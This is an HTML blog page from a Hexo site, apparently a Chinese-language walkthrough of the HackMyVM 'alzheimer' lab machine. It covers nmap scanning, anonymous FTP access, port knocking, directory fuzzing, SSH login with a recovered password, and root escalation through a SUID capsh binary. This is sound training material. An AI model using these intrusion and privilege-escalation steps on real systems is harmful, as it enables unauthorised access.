@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>alzheimer | hackboy</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="1.扫描网段 12345678910111213141516┌──(root㉿kali)-[&#x2F;home&#x2F;ace]└─# nmap -sP 192.168.56.0&#x2F;24Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-23 16:51 CSTNmap scan report for 192.168.56.1Host is up (0.0003">
+<meta property="og:type" content="article">
+<meta property="og:title" content="alzheimer">
+<meta property="og:url" content="http://example.com/2023/07/23/alzheimer/index.html">
+<meta property="og:site_name" content="hackboy">
+<meta property="og:description" content="1.扫描网段 12345678910111213141516┌──(root㉿kali)-[&#x2F;home&#x2F;ace]└─# nmap -sP 192.168.56.0&#x2F;24Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-23 16:51 CSTNmap scan report for 192.168.56.1Host is up (0.0003">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="f:%5CDESKTOP%5C%E6%B8%97%E9%80%8F%5Cimage%5Cimage-20230723175853705.png">
+<meta property="og:image" content="f:%5CDESKTOP%5C%E6%B8%97%E9%80%8F%5Cimage%5Cimage-20230723180449391.png">
+<meta property="article:published_time" content="2023-07-23T13:27:23.000Z">
+<meta property="article:modified_time" content="2023-07-30T11:40:59.373Z">
+<meta property="article:author" content="honkerZ">
+<meta property="article:tag" content="目录遍历">
+<meta property="article:tag" content="hackmyvm">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="f:%5CDESKTOP%5C%E6%B8%97%E9%80%8F%5Cimage%5Cimage-20230723175853705.png">
+  
+    <link rel="alternate" href="/atom.xml" title="hackboy" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">hackboy</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">hacking...</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-alzheimer" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/23/alzheimer/" class="article-date">
+  <time class="dt-published" datetime="2023-07-23T13:27:23.000Z" itemprop="datePublished">2023-07-23</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      alzheimer
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <span id="more"></span>
+
+<p>1.扫描网段</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sP 192.168.56.0/24</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-23</span> <span class="number">16</span>:<span class="number">51</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.1</span></span><br><span class="line">Host is up (<span class="number">0.00033</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>A:<span class="number">00</span>:<span class="number">27</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">0</span>A (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.100</span></span><br><span class="line">Host is up (<span class="number">0.00019</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:F1:<span class="number">8</span>F:<span class="number">2</span>D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.128</span></span><br><span class="line">Host is up (<span class="number">0.0021</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">79</span>:<span class="number">7</span>F:<span class="number">2</span>F (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts up) scanned <span class="keyword">in</span> <span class="number">2.01</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2.扫描端口</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -p- 192.168.56.128 </span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-23</span> <span class="number">16</span>:<span class="number">51</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.128</span></span><br><span class="line">Host is up (<span class="number">0.0013</span>s latency).</span><br><span class="line">Not shown: <span class="number">65532</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line"><span class="number">21</span>/tcp open     ftp     vsftpd <span class="number">3.0</span>.<span class="number">3</span></span><br><span class="line">|_ftp<span class="literal">-anon</span>: Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">| ftp<span class="literal">-syst</span>: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:<span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      <span class="built_in">TYPE</span>: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is <span class="number">300</span></span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      <span class="keyword">Data</span> connections will be plain text</span><br><span class="line">|      At session startup, client count was <span class="number">3</span></span><br><span class="line">|      vsFTPd <span class="number">3.0</span>.<span class="number">3</span> - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line"><span class="number">22</span>/tcp filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp filtered http</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">79</span>:<span class="number">7</span>F:<span class="number">2</span>F (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">6.70</span> seconds</span><br></pre></td></tr></table></figure>
+
+<p>3.由上述结果可知，ftp连接使用anonymous空密码登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/ace]</span><br><span class="line">└─# ftp 192.168.56.128</span><br><span class="line">Connected to 192.168.56.128.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.56.128:ace): Anonymous    </span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls -al</span><br><span class="line">229 Entering Extended Passive Mode (|||31145|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        113          4096 Oct 03  2020 .</span><br><span class="line">drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..</span><br><span class="line">-rw-r--r--    1 0        0              70 Oct 03  2020 .secretnote.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get .secretnote.txt</span><br><span class="line">local: .secretnote.txt remote: .secretnote.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||22343|)</span><br><span class="line">150 Opening BINARY mode data connection for .secretnote.txt (70 bytes).</span><br><span class="line">100% |*****************************************************************************************************|    70       33.75 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">70 bytes received in 00:00 (18.70 KiB/s)</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>
+
+<p>4.查看文件</p>
+<p><img src="F:%5CDESKTOP%5C%E6%B8%97%E9%80%8F%5Cimage%5Cimage-20230723175853705.png" alt="image-20230723175853705"></p>
+<p>说明要使用knockd工具打开端口</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># knock 192.168.56.128 1000:tcp 2000:tcp 3000:tcp -v</span></span><br><span class="line">hitting tcp <span class="number">192.168</span>.<span class="number">56.128</span>:<span class="number">1000</span></span><br><span class="line">hitting tcp <span class="number">192.168</span>.<span class="number">56.128</span>:<span class="number">2000</span></span><br><span class="line">hitting tcp <span class="number">192.168</span>.<span class="number">56.128</span>:<span class="number">3000</span></span><br></pre></td></tr></table></figure>
+
+<p>再度扫描端口：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -p- 192.168.56.128                   </span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-23</span> <span class="number">17</span>:<span class="number">35</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.128</span></span><br><span class="line">Host is up (<span class="number">0.0015</span>s latency).</span><br><span class="line">Not shown: <span class="number">65532</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">21</span>/tcp open  ftp     vsftpd <span class="number">3.0</span>.<span class="number">3</span></span><br><span class="line">|_ftp<span class="literal">-anon</span>: Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">| ftp<span class="literal">-syst</span>: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:<span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      <span class="built_in">TYPE</span>: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is <span class="number">300</span></span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      <span class="keyword">Data</span> connections will be plain text</span><br><span class="line">|      At session startup, client count was <span class="number">4</span></span><br><span class="line">|      vsFTPd <span class="number">3.0</span>.<span class="number">3</span> - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span>+deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>: </span><br><span class="line">|   <span class="number">2048</span> b13b2b36e56bd72a6defbfda0a5d2d43 (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">35</span>f170aba366f1d6d72cf7d1247a5f2b (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> be15fab681d67fabc81c97a5ea11854e (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|_http<span class="literal">-title</span>: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">|_http-server-header: nginx/1.14.2</span></span><br><span class="line"><span class="string">MAC Address: 08:00:27:79:7F:2F (Oracle VirtualBox virtual NIC)</span></span><br><span class="line"><span class="string">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 11.62 seconds</span></span><br><span class="line"><span class="string">                                                                     </span></span><br></pre></td></tr></table></figure>
+
+<p>80端口开放了 ，即网页可进行访问了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/ace]</span><br><span class="line">└─# curl -l 192.168.56.128</span><br><span class="line">I dont remember where I stored my password :(</span><br><span class="line">I only remember that was into a .txt file...</span><br><span class="line">-medusa</span><br><span class="line"></span><br><span class="line">&lt;!---. --- - .... .. -. --. --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>5.wfuzz扫一下</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># wfuzz -c --hc=404 -t200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.56.128/FUZZ.txt </span></span><br><span class="line"> /usr/lib/python3/dist<span class="literal">-packages</span>/wfuzz/__init__.py:<span class="number">34</span>: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://192.168.56.128/FUZZ.txt</span></span><br><span class="line"><span class="string">Total requests: 220560</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                                          </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000000001:   200        5 L      27 W       132 Ch      &quot;# directory-list-2.3-medium.txt&quot;                                                </span></span><br><span class="line"><span class="string">000000007:   200        5 L      27 W       132 Ch      &quot;# license, visit http://creativecommons.org/licenses/by-sa/3.0/&quot;                </span></span><br><span class="line"><span class="string">000000003:   200        5 L      27 W       132 Ch      &quot;# Copyright 2007 James Fisher&quot;                                                  </span></span><br><span class="line"><span class="string">000000004:   200        5 L      27 W       132 Ch      &quot;#&quot;                                                                              </span></span><br><span class="line"><span class="string">000000002:   200        5 L      27 W       132 Ch      &quot;#&quot;                                                                              </span></span><br><span class="line"><span class="string">000000005:   200        5 L      27 W       132 Ch      &quot;# This work is licensed under the Creative Commons&quot;                             </span></span><br><span class="line"><span class="string">000000008:   200        5 L      27 W       132 Ch      &quot;# or send a letter to Creative Commons, 171 Second Street,&quot;                     </span></span><br><span class="line"><span class="string">000000006:   200        5 L      27 W       132 Ch      &quot;# Attribution-Share Alike 3.0 License. To view a copy of this&quot;                  </span></span><br><span class="line"><span class="string">000000009:   200        5 L      27 W       132 Ch      &quot;# Suite 300, San Francisco, California, 94105, USA.&quot;                            </span></span><br><span class="line"><span class="string">000000010:   200        5 L      27 W       132 Ch      &quot;#&quot;                                                                              </span></span><br><span class="line"><span class="string">000000011:   200        5 L      27 W       132 Ch      &quot;# Priority ordered case-sensitive list, where entries were found&quot;               </span></span><br><span class="line"><span class="string">000000012:   200        5 L      27 W       132 Ch      &quot;# on at least 2 different hosts&quot;                                                </span></span><br><span class="line"><span class="string">000000013:   200        5 L      27 W       132 Ch      &quot;#&quot;                                                                              </span></span><br><span class="line"><span class="string">Total time: 0</span></span><br><span class="line"><span class="string">Processed Requests: 220560</span></span><br><span class="line"><span class="string">Filtered Requests: 220547</span></span><br><span class="line"><span class="string">Requests/sec.: 0</span></span><br></pre></td></tr></table></figure>
+
+<p>6.尝试登录ssh</p>
+<p>密码：Ihavebeenalwayshere!!!</p>
+<p>登陆成功：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># ssh medusa@192.168.56.128                                                                                                      </span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.128 (192.168.56.128)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:O2S8HAtlJxSTJJgIQUiIzsbSKX/qj9Thyn38JM6wsBY.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span><span class="number">192.168</span>.<span class="number">56.128</span><span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">medusa@192.168.56.128&#x27;</span>s password: </span><br><span class="line">Linux alzheimer <span class="number">4.19</span>.<span class="number">0</span><span class="literal">-9-amd64</span> <span class="comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sat Oct  <span class="number">3</span> <span class="number">06</span>:<span class="number">00</span>:<span class="number">36</span> <span class="number">2020</span> from <span class="number">192.168</span>.<span class="number">1.58</span></span><br><span class="line">medusa@alzheimer:~<span class="variable">$</span> </span><br></pre></td></tr></table></figure>
+
+<p>7.提权</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">medusa@alzheimer:~<span class="variable">$</span> find / <span class="literal">-user</span> root <span class="literal">-perm</span> <span class="literal">-4000</span> <span class="literal">-print</span> <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/lib/dbus<span class="literal">-1</span>.<span class="number">0</span>/dbus<span class="literal">-daemon-launch-helper</span></span><br><span class="line">/usr/lib/openssh/ssh<span class="literal">-keysign</span></span><br><span class="line">/usr/lib/eject/dmcrypt<span class="literal">-get-device</span></span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/<span class="built_in">mount</span></span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/sbin/capsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现：</p>
+<p><img src="F:%5CDESKTOP%5C%E6%B8%97%E9%80%8F%5Cimage%5Cimage-20230723180449391.png" alt="image-20230723180449391"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">medusa@alzheimer:~<span class="variable">$</span> /usr/sbin/capsh <span class="literal">--gid</span>=<span class="number">0</span> <span class="literal">--uid</span>=<span class="number">0</span> <span class="literal">--</span></span><br><span class="line">root@alzheimer:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@alzheimer:~<span class="comment"># cd root</span></span><br><span class="line">bash: <span class="built_in">cd</span>: root: No such file or directory</span><br><span class="line">root@alzheimer:~<span class="comment"># cd ..</span></span><br><span class="line">root@alzheimer:/home<span class="comment"># cd .</span></span><br><span class="line">root@alzheimer:/home<span class="comment"># cd ..</span></span><br><span class="line">root@alzheimer:/<span class="comment"># ls</span></span><br><span class="line">bin   dev  home        initrd.img.old  lib32  libx32      media  opt   root  sbin  sys  usr  vmlinuz</span><br><span class="line">boot  etc  initrd.img  lib             lib64  lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old</span><br><span class="line">root@alzheimer:/<span class="comment"># cd root</span></span><br><span class="line">root@alzheimer:/root<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@alzheimer:/root<span class="comment"># cat root.txt </span></span><br><span class="line">HMVlovememories</span><br><span class="line">root@alzheimer:/root<span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/07/23/alzheimer/" data-id="clmnr8k010003so8g8fmg9le5" data-title="alzheimer" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" rel="tag">目录遍历</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/07/24/beloved/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          beloved
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/hack-the-box/">hack the box</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/home/">home</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E5%AD%A6%E4%B9%A0/">linux学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/burp-suite/" rel="tag">burp suite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chown/" rel="tag">chown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/find/" rel="tag">find</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/" rel="tag">ftp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gittools/" rel="tag">gittools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/home/" rel="tag">home</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hydra/" rel="tag">hydra</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag">linux提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/" rel="tag">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msfs/" rel="tag">msfs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nmap/" rel="tag">nmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pspy/" rel="tag">pspy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellinabox/" rel="tag">shellinabox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a 